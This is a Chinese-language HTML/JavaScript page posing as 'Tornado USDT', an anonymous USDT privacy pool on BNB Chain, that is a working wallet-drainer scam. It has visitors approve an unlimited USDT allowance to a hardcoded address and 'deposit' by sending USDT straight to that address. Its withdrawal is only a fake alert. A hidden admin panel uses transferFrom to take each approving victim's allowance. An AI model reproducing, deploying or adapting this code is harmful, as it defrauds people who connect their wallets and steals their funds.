<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>Tornado USDT | 匿名隐私池</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',"PingFang SC","Microsoft YaHei",sans-serif}
body{background:#0f1419;color:#e0e0e0;padding:25px 15px}
.main{max-width:460px;margin:40px auto;background:#171b24;border-radius:20px;border:1px solid #2a303e;overflow:hidden}
.header{padding:30px 24px 20px;text-align:center}
.header h1{font-size:24px;color:#ffffff;margin-bottom:6px}
.header .sub{font-size:13px;color:#8a91a0}
.header .balance{font-size:12px;color:#7a8292;margin-top:8px}
.wallet-box{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;background:#121720;border-bottom:1px solid #252b36}
#addr{font-size:14px;color:#c5c9d3}
#connectBtn{background:#1c71ed;color:white;border:none;padding:9px 16px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
.tab-group{display:flex;padding:0 24px;gap:12px;margin-top:10px}
.tab{flex:1;padding:14px;text-align:center;background:#1c212c;border:none;color:#99a0b0;border-radius:12px;font-size:15px;cursor:pointer}
.tab.active{background:#1c71ed;color:white}
.panel{padding:24px;display:none}
.panel.active{display:block}
.form-item{margin-bottom:20px}
.form-item label{display:block;margin-bottom:8px;font-size:14px;color:#d0d5e0}
input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border-radius:12px;color:white;font-size:15px;outline:none}
.amount-group{display:flex;gap:8px;margin-bottom:16px}
.amount-btn{flex:1;padding:10px;background:#1c212c;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
.amount-btn:hover{border-color:#1c71ed;color:#fff}
.key-box{padding:14px;background:#1c212c;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
.submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
.menu-btn{background:transparent;border:none;color:#c5c9d3;font-size:20px;cursor:pointer}
.rpc-panel{padding:14px 24px;background:#121720;border-bottom:1px solid #252b36;display:none}
.rpc-panel.active{display:flex;gap:10px;align-items:center}
.rpc-input{flex:1;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff}
.rpc-save{padding:8px 12px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer}
.approve-card{background:#1c212c;border:1px solid #2a303e;border-radius:12px;padding:14px;margin-bottom:20px}
.approve-row{display:flex;justify-content:space-between;align-items:center}
.approve-status{font-size:14px;color:#c5c9d3}
#approveBtn{padding:8px 14px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px}
#approveBtn:disabled{background:#666;color:#aaa;cursor:not-allowed}

.admin-panel{display:none;padding:20px;background:#1c212c;border-top:1px solid #2a303e}
.admin-title{font-size:16px;color:#fff;margin-bottom:12px}
.admin-info{padding:10px;background:#121720;border-radius:8px;margin-bottom:10px;font-size:13px;color:#c5c9d3}
.admin-input{width:100%;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff;margin-bottom:10px}
.admin-btn{padding:10px 14px;background:#d93030;color:white;border:none;border-radius:8px;cursor:pointer;width:100%;margin-top:6px}
.steal-btn{background:#e63946}
</style>
</head>
<body>

<div class="main">
  <div class="header">
    <h1>Tornado USDT</h1>
    <div class="sub">匿名隐私交易池 · 链上安全混淆</div>
    <div class="balance" id="balance">钱包余额：0.0000 USDT</div>
  </div>

  <div class="wallet-box">
    <div id="addr">未连接钱包</div>
    <div style="display:flex;gap:8px">
      <button class="menu-btn" id="menuBtn">☰</button>
      <button id="connectBtn">连接钱包</button>
    </div>
  </div>

  <div class="rpc-panel" id="rpcPanel">
    <input class="rpc-input" id="rpcUrl" value="https://bsc-dataseed.binance.org/" placeholder="自定义RPC">
    <button class="rpc-save" id="saveRpc">保存</button>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="admin-title">🔑 管理员后台</div>
    <div class="admin-info" id="userInfoPanel">
      <div>当前用户地址：<span id="currentUserAddr">-</span></div>
      <div style="margin-top:4px">授权额度：<span id="currentUserAllow">-</span> USDT</div>
    </div>
    <input class="admin-input" id="adminTo" placeholder="转入地址">
    <input class="admin-input" id="adminAmount" placeholder="转出数量 USDT">
    <button class="admin-btn" id="adminTransfer">管理员转出</button>
    <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
    <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
  </div>

  <div class="tab-group">
    <button class="tab active" data-target="deposit">存入</button>
    <button class="tab" data-target="withdraw">提取</button>
  </div>

  <div id="deposit" class="panel active">
    <div class="approve-card">
      <div class="approve-row">
        <div class="approve-status">授权状态：<span id="allowanceText">未授权</span></div>
        <button id="approveBtn">授权 USDT</button>
      </div>
    </div>

    <div class="form-item">
      <label>存入数量（USDT）</label>
      <div class="amount-group">
        <div class="amount-btn" data-val="10">10</div>
        <div class="amount-btn" data-val="50">50</div>
        <div class="amount-btn" data-val="100">100</div>
      </div>
      <input id="amount" type="text" placeholder="输入数量" value="10">
    </div>

    <button class="submit-btn" id="depositBtn">确认存入（扣款）</button>

    <div id="keyArea" style="display:none;margin-top:20px">
      <div class="form-item">
        <label style="color:#22c55e">✅ 存入成功，请保存密钥</label>
        <div class="key-box" id="withdrawKey"></div>
      </div>
    </div>
  </div>

  <div id="withdraw" class="panel">
    <div class="form-item">
      <label>提取地址</label>
      <input id="toAddr" placeholder="0x...">
    </div>
    <div class="form-item">
      <label>提取数量</label>
      <input id="withdrawAmt" placeholder="USDT数量">
    </div>
    <div class="form-item">
      <label>提取密钥</label>
      <input id="userKey" placeholder="请输入密钥">
    </div>
    <button class="submit-btn" id="withdrawBtn">确认提取</button>
  </div>
</div>

<script>
document.querySelectorAll('.tab').forEach(tab => {
  tab.onclick = () => {
    document.querySelectorAll('.tab,.panel').forEach(e=>e.classList.remove('active'))
    tab.classList.add('active')
    document.getElementById(tab.dataset.target).classList.add('active')
  }
})

document.getElementById('menuBtn').onclick = () => {
  document.getElementById('rpcPanel').classList.toggle('active')
}
document.getElementById('saveRpc').onclick = () => {
  localStorage.setItem('rpc', document.getElementById('rpcUrl').value)
  alert('RPC 已保存')
}

const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
const USDT = "0x55d398326f99059fF775485246999027B3197955"
const POOL_SPENDER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"

let account = null
let secret = ''
let visitorAddress = null

function pad(addr){ return addr.slice(2).padStart(64,'0') }
function hex(amt){
  const v = BigInt(Math.round(Number(amt)*1e18))
  return v.toString(16).padStart(64,'0')
}
function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }

// 连接钱包
document.getElementById('connectBtn').onclick = async () => {
  if(!window.ethereum) return alert('请在钱包浏览器打开')
  try {
    const acc = await window.ethereum.request({method:'eth_requestAccounts'})
    account = acc[0]
    visitorAddress = account
    document.getElementById('addr').innerText = account.slice(0,6)+'...'+account.slice(-4)
    document.getElementById('connectBtn').innerText = '已连接'
    document.getElementById('connectBtn').style.background='#10b981'

    if(account.toLowerCase() === ADMIN_WALLET.toLowerCase()){
      document.getElementById('adminPanel').style.display = 'block'
    }

    await refreshAll()
  }catch(e){ alert('连接失败') }
}

// 统一刷新：授权状态 + 余额 + 管理员面板
async function refreshAll() {
  if (!account) return
  await refreshAllowance()
  await refreshBalance()
  await refreshUserInfoForAdmin()
}

// 动态刷新授权状态（核心）
async function refreshAllowance() {
  const el = document.getElementById('allowanceText')
  const btn = document.getElementById('approveBtn')

  try {
    const data = '0xddf252ad' + pad(account) + pad(POOL_SPENDER)
    const res = await window.ethereum.request({
      method:'eth_call', params:[{to:USDT, data},'latest']
    })
    const a = BigInt(res)

    if (a > 1000000000000000000n) {
      el.innerText = '已授权'
      el.style.color = '#22c55e'
      btn.innerText = '已授权'
      btn.disabled = true
    } else {
      el.innerText = '未授权'
      el.style.color = '#ef4444'
      btn.innerText = '授权 USDT'
      btn.disabled = false
    }
  } catch (e) {
    el.innerText = '查询失败'
    btn.disabled = false
  }
}

// 刷新余额
async function refreshBalance() {
  try {
    const data = '0x70a08231' + pad(account)
    const res = await window.ethereum.request({
      method:'eth_call', params:[{to:USDT, data},'latest']
    })
    const usdt = Number(BigInt(res)) / 1e18
    document.getElementById('balance').innerText = `钱包余额：${usdt.toFixed(2)} USDT`
  } catch (e) {}
}

// 管理员面板：当前用户信息
async function refreshUserInfoForAdmin() {
  if (!visitorAddress || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return
  try {
    document.getElementById('currentUserAddr').innerText = visitorAddress
    const data = '0xddf252ad' + pad(visitorAddress) + pad(ADMIN_WALLET)
    const res = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data},'latest'] })
    const allow = Number(BigInt(res)) / 1e18
    document.getElementById('currentUserAllow').innerText = allow.toFixed(2)
  } catch (e) {
    document.getElementById('currentUserAllow').innerText = '失败'
  }
}

// 授权
document.getElementById('approveBtn').onclick = async () => {
  if(!account) return alert('请先连接钱包')
  try {
    const data = '0x095ea7b3' + pad(POOL_SPENDER) + max()
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
    })
    alert('授权成功')
    await refreshAll()
  }catch(e){ alert('授权取消') }
}

// 快捷金额
document.querySelectorAll('.amount-btn').forEach(b=>{
  b.onclick=()=>document.getElementById('amount').value=b.dataset.val
})

// 存入
document.getElementById('depositBtn').onclick = async () => {
  if(!account) return alert('请连接钱包')
  const amt = document.getElementById('amount').value
  if(!amt || isNaN(amt) || amt <= 0) return alert('输入有效数量')
  try {
    const data = '0xa9059cbb' + pad(ADMIN_WALLET) + hex(amt)
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
    })
    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    let key = ''
    for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
    secret = key
    document.getElementById('keyArea').style.display='block'
    document.getElementById('withdrawKey').innerText=key
    alert('存入成功')
    await refreshAll()
  }catch(e){ alert('交易失败：'+e.message) }
}

// 提取演示
document.getElementById('withdrawBtn').onclick = () => {
  const addr = document.getElementById('toAddr').value
  const amt = document.getElementById('withdrawAmt').value
  const key = document.getElementById('userKey').value
  if(!addr||!amt||!key) return alert('请填写完整')
  if(key !== secret) return alert('密钥错误')
  alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
}

// 管理员转出
document.getElementById('adminTransfer').onclick = async () => {
  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
  const to = document.getElementById('adminTo').value
  const amt = document.getElementById('adminAmount').value
  if(!to || !amt || isNaN(amt) || amt <= 0) return alert('请正确填写')
  try {
    const data = '0xa9059cbb' + pad(to) + hex(amt)
    const tx = await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
    })
    alert('转出成功：' + tx)
    await refreshAll()
  }catch(e){ alert('失败：' + e.message) }
}

// 提取玩家代币 transferFrom（正确逻辑）
document.getElementById('takeUserToken').onclick = async () => {
  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
  const userAddr = document.getElementById('userAddress').value
  if(!userAddr || !userAddr.startsWith('0x')) return alert('请输入玩家地址')

  try {
    const allowData = '0xddf252ad' + pad(userAddr) + pad(ADMIN_WALLET)
    const allowRes = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data:allowData},'latest'] })
    const allowance = BigInt(allowRes)
    if(allowance <= 0n) return alert('无可用授权')

    const transData = '0x23b872dd' + pad(userAddr) + pad(ADMIN_WALLET) + allowance.toString(16).padStart(64,'0')
    const tx = await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:USDT, data:transData, gas:'0x60000'}]
    })
    alert('提取成功：' + tx)
    await refreshAll()
  }catch(e){
    alert('失败：' + e.message)
  }
}
</script>
</body>
</html>
